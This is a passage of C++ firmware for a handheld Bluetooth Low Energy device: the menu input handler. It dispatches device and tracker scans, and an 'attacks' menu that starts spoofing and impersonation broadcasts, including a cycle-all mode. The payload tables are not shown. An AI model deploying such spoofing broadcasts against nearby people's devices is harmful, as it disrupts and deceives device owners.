        if (s_state == BleState::SPOOF_LIST || s_state == BleState::IMPERSONATE_LIST) {
            s_menuSel = 0;
            s_state = BleState::ATTACKS_MENU; s_dirty = true; return;
        }
        if (s_state == BleState::ATTACKS_MENU) {
            s_menuSel = 0;
            s_state = BleState::MENU; s_dirty = true; return;
        }
        if (s_state == BleState::MENU) {
            shutdownBle(); goHome(); return;
        }
        if (s_scan && s_scan->isScanning()) s_scan->stop();
        s_menuSel = 0;
        s_state = BleState::MENU; s_dirty = true; return;
    }

    switch (s_state) {
        case BleState::MENU:
            if (ev.up   && s_menuSel>0) { s_menuSel--; s_dirty=true; break; }
            if (ev.down && s_menuSel<2) { s_menuSel++; s_dirty=true; break; }
            if (ev.enter) {
                if (s_menuSel==0) {
                    s_devCount=0; s_scroll=0; s_scanMode=ScanMode::DEVICES;
                    s_scan->setAdvertisedDeviceCallbacks(&s_callbacks);
                    drawScanning(false); doScan(SCAN_SECS);
                    s_state=BleState::TRACKER_SCAN;
                } else if (s_menuSel==1) {
                    s_trkCount=0; s_scroll=0; s_scanMode=ScanMode::TRACKERS;
                    s_scan->setAdvertisedDeviceCallbacks(&s_trkCallbacks);
                    drawScanning(true); doScan(8);
                    s_state=BleState::TRACKER_SCAN;
                } else {
                    s_menuSel=0; s_state=BleState::ATTACKS_MENU; s_dirty=true;
                }
            }
            break;

        case BleState::ATTACKS_MENU:
            if (ev.up   && s_menuSel>0) { s_menuSel--; s_dirty=true; break; }
            if (ev.down && s_menuSel<1) { s_menuSel++; s_dirty=true; break; }
            if (ev.enter) {
                if (s_menuSel==0) {
                    s_attackSub=AttackSub::SPOOF; s_spoofSel=0; s_scroll=0;
                    s_state=BleState::SPOOF_LIST; s_dirty=true;
                } else {
                    s_attackSub=AttackSub::IMPERSONATE; s_impSel=0; s_scroll=0;
                    s_state=BleState::IMPERSONATE_LIST; s_dirty=true;
                }
            }
            break;

        case BleState::SPOOF_LIST:
            if (ev.up   && s_spoofSel>0)           { s_spoofSel--; s_dirty=true; }
            if (ev.down && s_spoofSel<N_SPOOFER-1) { s_spoofSel++; s_dirty=true; }
            if (ev.enter) {
                s_bcastSub = AttackSub::SPOOF;
                if (s_spoofSel == N_SPOOFER-1) {
                    // Cycle all
                    s_cycleMode=true; s_cycleIdx=0; s_cycleMs=millis();
                    s_bcastIdx=CYCLE_ORDER[0];
                    startBroadcast(&SPOOFER_TARGETS[s_bcastIdx]);
                } else {
                    s_cycleMode=false; s_bcastIdx=s_spoofSel;
                    startBroadcast(&SPOOFER_TARGETS[s_bcastIdx]);
                }
                s_state=BleState::BROADCASTING; s_dirty=true;
            }
            break;

        case BleState::IMPERSONATE_LIST:
            if (ev.up   && s_impSel>0)                { s_impSel--; s_dirty=true; }
            if (ev.down && s_impSel<N_IMPERSONATE-1)  { s_impSel++; s_dirty=true; }
            if (ev.enter) {
                s_bcastSub = AttackSub::IMPERSONATE;
                if (s_impSel == N_IMPERSONATE-1) {
                    s_cycleMode=true; s_cycleIdx=0; s_cycleMs=millis();
                    s_bcastIdx=IMP_CYCLE[0];
                    startBroadcast(&IMPERSONATE_TARGETS[s_bcastIdx]);
                } else {
                    s_cycleMode=false; s_bcastIdx=s_impSel;
                    startBroadcast(&IMPERSONATE_TARGETS[s_bcastIdx]);
                }
                s_state=BleState::BROADCASTING; s_dirty=true;
            }
            break;

        case BleState::LIST:
            if (ev.up   && s_scroll>0)              { s_scroll--; s_dirty=true; }
            if (ev.down && s_scroll<s_devCount-1)   { s_scroll++; s_dirty=true; }
            if (ev.enter) {
                s_devCount=0; s_scroll=0; s_scanMode=ScanMode::DEVICES;
                s_scan->setAdvertisedDeviceCallbacks(&s_callbacks);
                drawScanning(false); doScan(SCAN_SECS);
                s_state=BleState::TRACKER_SCAN;
            }
            break;

        case BleState::TRACKER_DONE:
            if (ev.up   && s_scroll>0)              { s_scroll--; s_dirty=true; }
            if (ev.down && s_scroll<s_trkCount-1)   { s_scroll++; s_dirty=true; }
            if (ev.enter) {
                s_trkCount=0; s_scroll=0; s_scanMode=ScanMode::TRACKERS;
                s_scan->setAdvertisedDeviceCallbacks(&s_trkCallbacks);
                drawScanning(true); doScan(8);
                s_state=BleState::TRACKER_SCAN;
            }
            break;

        default: break;
    }
}
